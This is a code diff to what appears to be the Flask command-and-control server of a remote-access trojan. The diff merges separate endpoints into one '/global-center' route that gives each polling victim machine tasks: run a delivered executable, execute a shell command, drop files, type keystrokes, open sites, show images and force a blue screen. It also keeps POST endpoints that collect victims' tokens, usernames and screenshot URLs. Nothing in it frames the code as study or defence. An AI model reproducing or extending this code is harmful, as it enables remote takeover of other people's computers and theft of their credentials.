@@ -21,7 +21,7 @@ runfile: bytes = b""
 runfile_args: str = ""
 runfile_ips: list[str] = []
 
-screenshot_urls: list[bytes] = []
+screenshot_urls: list[str] = []
 take_screenshot: bool = False
 screenshot_ips: list[str] = []
 
@@ -50,167 +50,113 @@ get_token: bool = False
 # Centers
 
 
-@app.route("/gettokens-center", methods=["GET", "POST"])
-def gettoken_center() -> Response:
-    global get_token, tokens
-    if request.method == "GET":
-        if not get_token:
-            return Response("dont grab token", 204)
-        else:
-            return Response("send me ur token pls", 200)
-    elif request.method == "POST":
-        token = request.args.get("token")
-        if get_token and token not in tokens:
-            tokens.append(token)
-            return Response("added token", 200)
-        else:
-            return Response("u cant do that rn", 400)
-
-
-@app.route("/typestring-center", methods=["GET"])
-def typestring_center() -> Response:
+@app.route("/global-center", methods=["GET"])
+def global_center() -> Response:
     global typestring_delay, typestring_ips, typestring
-    if len(typestring) == 0:
-        return Response("no strings to type", 204)
-    else:
-        remote_ip = get_remote_address()
-        if remote_ip in typestring_ips:
-            return Response("u cant do that rn", 400)
-        else:
-            typestring_ips.append(remote_ip)
-            return jsonify(text=typestring, delay=typestring_delay)
-
-
-@app.route("/playsound-center", methods=["GET"])
-def playsound_center() -> Response:
+    global runfile_args, runfile_ips, runfile
+    global take_screenshot, screenshot_ips
     global playsound_ips, sound_file
-    if len(sound_file) == 0:
-        return Response("no sounds to play", 204)
-    else:
-        remote_ip = get_remote_address()
-        if remote_ip in playsound_ips:
-            return Response("u cant do that rn", 400)
-        else:
-            playsound_ips.append(remote_ip)
-            return sound_file
-
-
-@app.route("/getuser-center", methods=["GET", "POST"])
-def getuser_center() -> Response:
-    global getuser_ips, get_user, users
-    if request.method == "GET":
-        if not get_user:
-            return Response("no screenshots to take", 204)
-        else:
-            return Response("send username pls", 200)
-    elif request.method == "POST":
-        remote_ip = get_remote_address()
-        if get_user and remote_ip not in getuser_ips:
-            users.append(request.args.get("username"))
-            getuser_ips.append(remote_ip)
-            return Response("added user", 200)
-        else:
-            return Response("u cant do that rn", 400)
-
-
-@app.route("/dropfile-center", methods=["GET"])
-def dropfile_center() -> Response:
-    global dropfile_location, dropfile_ips, dropfile
-    if len(dropfile) == 0:
-        return Response("no files to drop", 204)
-    else:
-        remote_ip = get_remote_address()
-        if remote_ip in dropfile_ips:
-            return Response("u cant do that rn", 400)
-        else:
-            runfile_ips.append(remote_ip)
-            return {
-                "dropfile": b64encode(dropfile).decode(),
-                "location": dropfile_location,
-            }
-
-
-@app.route("/website-center", methods=["GET"])
-def website_center() -> Response:
+    global getuser_ips, get_user
     global website_ips, website
-    if len(website) == 0:
-        return Response("no websites to open", 204)
+    global command_ips, command
+    global image_ips, image
+    global bsod_activated
+    global get_token
+
+    output_dict = {}
+    remote_ip = get_remote_address()
+
+    if get_token:
+        output_dict["gettokens"] = True
+
+    if len(typestring) and remote_ip not in typestring_ips:
+        typestring_ips.append(remote_ip)
+        output_dict["typestring"] = {
+            "typestring": typestring,
+            "typestring_delay": typestring_delay,
+        }
+
+    if len(sound_file) and remote_ip not in playsound_ips:
+        playsound_ips.append(remote_ip)
+        output_dict["playsound"] = b64encode(sound_file).decode()
+
+    if get_user and remote_ip not in getuser_ips:
+        output_dict["getuser"] = True
+
+    if len(dropfile) and remote_ip not in dropfile_ips:
+        dropfile_ips.append(remote_ip)
+        output_dict["dropfile"] = {
+            "dropfile": b64encode(dropfile).decode(),
+            "dropfile_location": dropfile_location,
+        }
+
+    if len(website) and remote_ip not in website_ips:
+        website_ips.append(remote_ip)
+        output_dict["website"] = website
+
+    if take_screenshot and remote_ip not in screenshot_ips:
+        output_dict["screenshot"] = True
+
+    if len(runfile) and remote_ip not in runfile_ips:
+        runfile_ips.append(remote_ip)
+        output_dict["runfile"] = {
+            "runfile": b64encode(runfile).decode(),
+            "runfile_args": runfile_args,
+        }
+
+    if len(command) and remote_ip not in command_ips:
+        command_ips.append(remote_ip)
+        output_dict["command"] = command
+
+    if len(image) and remote_ip not in image_ips:
+        image_ips.append(remote_ip)
+        output_dict["image"] = b64encode(image).decode()
+
+    if bsod_activated:
+        output_dict["bsod"] = True
+
+    if len(output_dict):
+        return jsonify(output_dict)
     else:
-        remote_ip = get_remote_address()
-        if remote_ip in website_ips:
-            return Response("u cant do that rn", 400)
-        else:
-            website_ips.append(remote_ip)
-            return Response(website, 200)
+        return Response("nothing to do", 204)
 
 
-@app.route("/screenshot-center", methods=["GET", "POST"])
+@app.route("/screenshot-center", methods=["POST"])
 def screenshot_center() -> Response:
     global take_screenshot, screenshot_urls, screenshot_ips
-    if request.method == "GET":
-        if not take_screenshot:
-            return Response("no screenshots to take", 204)
-        else:
-            return Response("take screenshot", 200)
-    elif request.method == "POST":
-        remote_ip = get_remote_address()
-        if take_screenshot and remote_ip not in screenshot_ips:
-            screenshot_urls.append(request.args.get("download_page"))
-            screenshot_ips.append(remote_ip)
-            return Response("added url", 200)
-        else:
-            return Response("u cant do that rn", 400)
 
-
-@app.route("/runfile-center", methods=["GET"])
-def runfile_center() -> Response:
-    global runfile_ips, runfile_args, runfile
-    if len(runfile) == 0:
-        return Response("no files to execute", 204)
+    remote_ip = get_remote_address()
+    if take_screenshot and remote_ip not in screenshot_ips:
+        screenshot_urls.append(request.args.get("download_page"))
+        screenshot_ips.append(remote_ip)
+        return Response("added url", 200)
     else:
-        remote_ip = get_remote_address()
-        if remote_ip in runfile_ips:
-            return Response("u cant do that rn", 400)
-        else:
-            runfile_ips.append(remote_ip)
-            return {"runfile": b64encode(runfile).decode(), "args": runfile_args}
+        return Response("u cant do that rn", 400)
 
 
-@app.route("/command-center", methods=["GET"])
-def command_center() -> Response:
-    global command_ips, command
-    if len(command) == 0:
-        return Response("no commands to execute", 204)
+@app.route("/gettokens-center", methods=["POST"])
+def gettoken_center() -> Response:
+    global get_token, tokens
+
+    token = request.args.get("token")
+    if get_token and token not in tokens:
+        tokens.append(token)
+        return Response("added token", 200)
     else:
-        remote_ip = get_remote_address()
-        if remote_ip in command_ips:
-            return Response("u cant do that rn", 400)
-        else:
-            command_ips.append(remote_ip)
-            return Response(command, 200)
+        return Response("u cant do that rn", 400)
 
 
-@app.route("/image-center", methods=["GET"])
-def image_center() -> Response:
-    global image_ips, image
-    if len(image) == 0:
-        return Response("no images to show", 204)
+@app.route("/getuser-center", methods=["POST"])
+def getuser_center() -> Response:
+    global getuser_ips, get_user, users
+
+    remote_ip = get_remote_address()
+    if get_user and remote_ip not in getuser_ips:
+        users.append(request.args.get("username"))
+        getuser_ips.append(remote_ip)
+        return Response("added user", 200)
     else:
-        remote_ip = get_remote_address()
-        if remote_ip in image_ips:
-            return Response("u cant do that rn", 400)
-        else:
-            image_ips.append(remote_ip)
-            return image
-
-
-@app.route("/bsod-center", methods=["GET"])
-def bsod_center() -> Response:
-    global bsod_activated
-    if bsod_activated:
-        return Response("1", 200)
-    else:
-        return Response("0", 204)
+        return Response("u cant do that rn", 400)
 
 
 # Other
